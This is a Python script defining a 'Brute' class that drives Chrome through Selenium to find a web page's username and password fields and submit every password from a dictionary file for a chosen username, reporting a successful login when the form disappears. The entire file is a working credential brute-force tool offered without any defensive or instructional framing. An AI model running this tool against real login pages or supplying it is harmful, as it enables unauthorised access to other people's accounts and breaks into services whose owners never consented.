import requests
from bs4 import BeautifulSoup
import re
from win32com.client import Dispatch
import os
import zipfile
from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys

class Brute:
    def __init__(self):
        self.url = ''
        self.txtfle = ''
        self.currentpswd = ''

    def set_url(self, url):
        self.url = url
    
    def set_dictionary(self, dicta):
        self.txtfle = dicta

    def get_input_vars(self, html):
        soup = BeautifulSoup(html, "lxml")

        usernamebool = False
        passwordbool = False
        for _form in soup.find_all('form'):
            for _input in _form.find_all('input'):
                __input = str(_input)

                if re.search('username', __input, re.IGNORECASE):
                    if _input.get('type') == 'hidden':
                        continue
                    usernameid = (_input.get('id'))
                    usernamename = (_input.get('name'))
                    usernamebool = True

                if re.search('password', __input, re.IGNORECASE):
                    if _input.get('type') == 'hidden':
                        continue
                    passwordid = (_input.get('id'))
                    passwordname = (_input.get('name'))
                    passwordbool = True
                
                if usernamebool and passwordbool:
                    formid = (_form.get('id'))
                    formname = (_form.get('id'))

        return {"usernameid": usernameid,
                "usernamename": usernamename,
                "passwordid": passwordid,
                "passwordname": passwordname,
                "formid": formid,
                "formname": formname}


    def get_chrome_version(self):
        def get_version_via_com(filename):
            parser = Dispatch("Scripting.FileSystemObject")
            try:
                version = parser.GetFileVersion(filename)
            except Exception:
                return None
            return version

        paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
        version = list(filter(None, [get_version_via_com(p) for p in paths]))[0]

        return version

    def download_chrome_driver(self):
        chromedriverpth = (os.getcwd()+"/chromedriver/")
        if not os.path.exists(chromedriverpth):
            os.makedirs(chromedriverpth)

        _versionFirstnumber = str(self.get_chrome_version()).split('.')[0]

        r = requests.get(f"https://chromedriver.storage.googleapis.com/LATEST_RELEASE_{_versionFirstnumber}")
        lastestChromeVer = ((r.content).decode())

        def extract(filenm):
            os.system(f'curl -o ./chromedriver/{filenm} https://chromedriver.storage.googleapis.com/{lastestChromeVer}/chromedriver_win32.zip')
            chromedriverpthwithzip = chromedriverpth+filenm
            with zipfile.ZipFile(chromedriverpthwithzip, 'r') as zip_ref:
                zip_ref.extractall(chromedriverpth)
            os.remove(chromedriverpthwithzip)

        if os.name == 'posix':
            extract('/chromedriver_linux64.zip')
        if os.name == 'nt':
            extract('/chromedriver_win32.zip')

    def start_Ebrute(self, usrnm):
        self.download_chrome_driver()
        driver = webdriver.Chrome(os.getcwd()+'\\chromedriver\\chromedriver.exe')
        chromoptions = webdriver.ChromeOptions()
        chromoptions.add_argument("--disable-extensions")
        chromoptions.add_argument("--disable-popup-blocking")
        driver.get(self.url)
        time.sleep(5)

        inpvars = self.get_input_vars(driver.page_source)

        print(inpvars)

        self.txtfle = (self.txtfle).replace('.txt', '')

        dicfile = open(f'dictionaries/{self.txtfle}.txt', 'r')

        useusernameid = False
        usepasswordid = False
        useformid = False

        if inpvars["usernameid"] == None or inpvars["usernameid"] == "None":
            usernamelocate = inpvars["usernamename"]
            useusernameid = False
        else:
            usernamelocate = inpvars["usernameid"]
            useusernameid = True

        if inpvars["passwordid"] == None or inpvars["passwordid"] == "None":
            passwordlocate = inpvars["passwordname"]
            usepasswordid = False
        else:
            passwordlocate = inpvars["passwordid"]
            usepasswordid = True

        if inpvars["formid"] == None or inpvars["formid"] == "None":
            formlocate = inpvars["formname"]
            useformid = False
        else:
            formlocate = inpvars["formid"]
            useformid = True

        for pswd in dicfile:
            self.currentpswd = pswd
            try:
                if useusernameid:
                    driver.find_element_by_id(usernamelocate).send_keys(usrnm)
                else:
                    driver.find_element_by_name(usernamelocate).send_keys(usrnm)
                
                if usepasswordid:
                    driver.find_element_by_id(passwordlocate).send_keys(pswd)
                else:
                    driver.find_element_by_name(passwordlocate).send_keys(pswd)

                if useformid:
                    driver.find_element_by_id(formlocate).submit()
                else:
                    driver.find_element_by_name(formlocate).submit()
                

                if useusernameid:
                    userelement = driver.find_element_by_id(usernamelocate)
                else:
                    userelement = driver.find_element_by_name(usernamelocate)

                userelement.send_keys(Keys.CONTROL + "a")
                userelement.send_keys(Keys.DELETE)

                if usepasswordid:
                    passelement = driver.find_element_by_id(passwordlocate)
                else:
                    passelement = driver.find_element_by_name(passwordlocate)
                passelement.send_keys(Keys.CONTROL + "a")
                passelement.send_keys(Keys.DELETE)

            except:
                print("Successful log in")
                time.sleep(100000)
            time.sleep(3)